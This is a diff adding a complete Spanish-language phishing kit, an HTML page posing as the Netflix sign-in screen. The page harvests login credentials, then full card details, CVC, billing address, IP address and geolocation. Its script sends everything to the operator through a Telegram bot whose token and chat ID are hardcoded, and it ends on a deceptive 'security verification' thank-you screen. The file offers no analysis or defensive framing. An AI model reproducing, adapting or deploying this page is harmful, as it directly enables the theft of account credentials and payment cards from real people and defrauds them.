@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Iniciar sesión - Netflix</title>
+  <link rel="icon" type="image/png" href="https://i.postimg.cc/Bb6W67H7/Netflix-Logo-PNG-Transparent-Image.png" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: url('https://i.postimg.cc/q7BYN6dD/login-netflix-fondo.png') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container, #payment-container, #thankyou-container {
+      width: 430px;
+      border-radius: 8px;
+      padding: 40px 60px;
+      box-sizing: border-box;
+      color: #fff;
+    }
+
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      background: transparent;
+      transform: translateY(50px);
+    }
+    #payment-container, #thankyou-container {
+      background: #fff;
+      color: #111;
+      display: none;
+    }
+
+    h1, h2 {
+      margin-bottom: 30px;
+      font-weight: 600;
+    }
+    h1 {
+      font-size: 36px;
+    }
+    h2 {
+      font-size: 28px;
+      text-align: center;
+      color: #e50914;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      border-radius: 4px;
+      border: none;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+    }
+
+    input[type="email"], input[type="password"], input[type="text"] {
+      background: #333;
+      color: #fff;
+      border: none;
+    }
+    #payment-container input {
+      background: #fff;
+      color: #111;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      background: #e50914;
+      color: white;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: 700;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #f40612;
+    }
+
+    .row {
+      display: flex;
+      gap: 15px;
+    }
+    .row input {
+      flex: 1;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    #thankyou-container p {
+      margin-bottom: 20px;
+      font-size: 16px;
+      line-height: 1.4;
+    }
+
+    #thankyou-container .button-home {
+      background-color: #e50914;
+      color: white;
+      padding: 14px 30px;
+      border-radius: 4px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+      display: inline-block;
+      transition: background-color 0.3s ease;
+    }
+    #thankyou-container .button-home:hover {
+      background-color: #f40612;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LOGIN -->
+  <div class="login-container" id="login-container">
+    <h1>Iniciar sesión</h1>
+    <form id="login-form" novalidate>
+      <input type="email" id="loginEmail" placeholder="Correo o número de teléfono" required />
+      <div class="error-message" id="loginEmailError">Por favor, ingrese un correo válido.</div>
+
+      <input type="password" id="loginPassword" placeholder="Contraseña" required />
+      <div class="error-message" id="loginPasswordError">La contraseña no puede estar vacía.</div>
+
+      <button type="submit">Iniciar sesión</button>
+    </form>
+  </div>
+
+  <!-- PAGO -->
+  <div id="payment-container">
+    <h2>Actualizar método de pago</h2>
+    <form id="payment-form" novalidate>
+      <input type="text" id="cardNumber" placeholder="Número de tarjeta (16 dígitos)" maxlength="19" required />
+      <div class="error-message" id="cardNumberError">Número de tarjeta inválido.</div>
+
+      <input type="text" id="cardName" placeholder="Nombre en la tarjeta" required />
+      <div class="error-message" id="cardNameError">Por favor, ingrese su nombre.</div>
+
+      <div class="row">
+        <input type="text" id="cardExp" placeholder="Expiración (MM/AA)" maxlength="5" required />
+        <div class="error-message" id="cardExpError">Fecha inválida. Formato MM/AA.</div>
+
+        <input type="text" id="cardCVC" placeholder="CVC" maxlength="4" required />
+        <div class="error-message" id="cardCVCError">CVC inválido.</div>
+      </div>
+
+      <input type="email" id="cardEmail" placeholder="Correo electrónico" required />
+      <div class="error-message" id="cardEmailError">Correo inválido.</div>
+
+      <input type="text" id="direccion" placeholder="Dirección completa" required />
+      <div class="error-message" id="direccionError">Por favor, ingrese su dirección.</div>
+
+      <div class="row">
+        <input type="text" id="ciudad" placeholder="Ciudad" required />
+        <div class="error-message" id="ciudadError">Por favor, ingrese su ciudad.</div>
+
+        <input type="text" id="estado" placeholder="Estado / Provincia" required />
+        <div class="error-message" id="estadoError">Por favor, ingrese su estado o provincia.</div>
+      </div>
+
+      <input type="text" id="postal" placeholder="Código postal" required />
+      <div class="error-message" id="postalError">Código postal inválido.</div>
+
+      <button type="submit">Actualizar pago</button>
+
+      <p class="disclaimer">
+        Esta página está protegida por Google reCAPTCHA. <a href="#">Más información.</a>
+      </p>
+    </form>
+  </div>
+
+  <!-- MENSAJE DE GRACIAS -->
+  <div id="thankyou-container" role="main">
+    <h2>¡Gracias por verificar su pago!</h2>
+    <p>Su cuenta está completamente segura y actualizada.</p>
+    <p>Le informamos que no se ha realizado ningún cobro en su tarjeta; este proceso fue únicamente una verificación de seguridad.</p>
+    <p>Agradecemos su confianza y preferencia.</p>
+    <a href="https://www.netflix.com/do-en/" class="button-home">Volver al inicio</a>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7404490057:AAHdiLaw2aUCga0hKjllg_1OWmsSF2AflSc';
+    const CHAT_ID = '1221652451';
+
+    function validarEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    function validarTarjeta(numero) {
+      const num = numero.replace(/\s+/g, '');
+      return /^\d{16}$/.test(num);
+    }
+
+    function validarExpiracion(exp) {
+      if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
+      const [mes, anio] = exp.split('/').map(Number);
+      if (mes < 1 || mes > 12) return false;
+      const actual = new Date();
+      const anioActual = actual.getFullYear() % 100;
+      const mesActual = actual.getMonth() + 1;
+      if (anio < anioActual) return false;
+      if (anio === anioActual && mes < mesActual) return false;
+      return true;
+    }
+
+    function validarCVC(cvc) {
+      return /^\d{3,4}$/.test(cvc);
+    }
+
+    function validarCodigoPostal(cp) {
+      return /^[a-zA-Z0-9\s\-]{4,10}$/.test(cp);
+    }
+
+    function mostrarError(id, mostrar) {
+      const elem = document.getElementById(id);
+      if(elem) elem.style.display = mostrar ? 'block' : 'none';
+    }
+
+    async function obtenerIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'IP no disponible';
+      }
+    }
+
+    function obtenerGeolocalizacion() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ lat: 'No soportado', lon: 'No soportado' });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+          () => resolve({ lat: 'No permitido', lon: 'No permitido' }),
+          { timeout: 10000 }
+        );
+      });
+    }
+
+    let loginData = {};
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = this.querySelector('#loginEmail').value.trim();
+      const password = this.querySelector('#loginPassword').value.trim();
+
+      let valid = true;
+
+      if (!validarEmail(email)) {
+        mostrarError('loginEmailError', true);
+        valid = false;
+      } else {
+        mostrarError('loginEmailError', false);
+      }
+
+      if (password.length === 0) {
+        mostrarError('loginPasswordError', true);
+        valid = false;
+      } else {
+        mostrarError('loginPasswordError', false);
+      }
+
+      if (!valid) return;
+
+      loginData = { loginEmail: email, loginPassword: password };
+
+      document.getElementById('login-container').style.display = 'none';
+      document.getElementById('payment-container').style.display = 'block';
+      document.body.style.background = '#f2f2f2';
+    });
+
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const cardNumber = this.querySelector('#cardNumber').value.trim();
+      const cardName = this.querySelector('#cardName').value.trim();
+      const cardExp = this.querySelector('#cardExp').value.trim();
+      const cardCVC = this.querySelector('#cardCVC').value.trim();
+      const cardEmail = this.querySelector('#cardEmail').value.trim();
+      const direccion = this.querySelector('#direccion').value.trim();
+      const ciudad = this.querySelector('#ciudad').value.trim();
+      const estado = this.querySelector('#estado').value.trim();
+      const postal = this.querySelector('#postal').value.trim();
+
+      let valid = true;
+
+      if (!validarTarjeta(cardNumber)) mostrarError('cardNumberError', true), valid = false; else mostrarError('cardNumberError', false);
+      if (cardName.length === 0) mostrarError('cardNameError', true), valid = false; else mostrarError('cardNameError', false);
+      if (!validarExpiracion(cardExp)) mostrarError('cardExpError', true), valid = false; else mostrarError('cardExpError', false);
+      if (!validarCVC(cardCVC)) mostrarError('cardCVCError', true), valid = false; else mostrarError('cardCVCError', false);
+      if (!validarEmail(cardEmail)) mostrarError('cardEmailError', true), valid = false; else mostrarError('cardEmailError', false);
+      if (direccion.length === 0) mostrarError('direccionError', true), valid = false; else mostrarError('direccionError', false);
+      if (ciudad.length === 0) mostrarError('ciudadError', true), valid = false; else mostrarError('ciudadError', false);
+      if (estado.length === 0) mostrarError('estadoError', true), valid = false; else mostrarError('estadoError', false);
+      if (!validarCodigoPostal(postal)) mostrarError('postalError', true), valid = false; else mostrarError('postalError', false);
+
+      if (!valid) return;
+
+      const ip = await obtenerIP();
+      const geo = await obtenerGeolocalizacion();
+
+      const mensaje = `🛡️ *Nuevo inicio de sesión Netflix*\n\n` +
+                      `📧 Email/Login: ${loginData.loginEmail}\n🔒 Contraseña: ${loginData.loginPassword}\n\n` +
+                      `💳 Tarjeta: ${cardNumber}\n🙍 Nombre: ${cardName}\n📅 Expira: ${cardExp}\n🔐 CVC: ${cardCVC}\n📩 Correo: ${cardEmail}\n\n` +
+                      `🏠 Dirección: ${direccion}\n🌆 Ciudad: ${ciudad}\n🗺️ Estado: ${estado}\n📮 Código Postal: ${postal}\n\n` +
+                      `🌐 IP del usuario: ${ip}\n` +
+                      `📍 Geolocalización: Latitud ${geo.lat}, Longitud ${geo.lon}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.ok) {
+          alert('❌ Error al enviar a Telegram: ' + (data.description || 'Desconocido'));
+          console.error(data);
+          return;
+        }
+        document.getElementById('payment-container').style.display = 'none';
+        document.getElementById('thankyou-container').style.display = 'block';
+        document.body.style.background = '#fff';
+      })
+      .catch(err => {
+        alert('❌ Error en la petición: ' + err.message);
+        console.error(err);
+      });
+    });
+  </script>
+
+</body>
+</html>
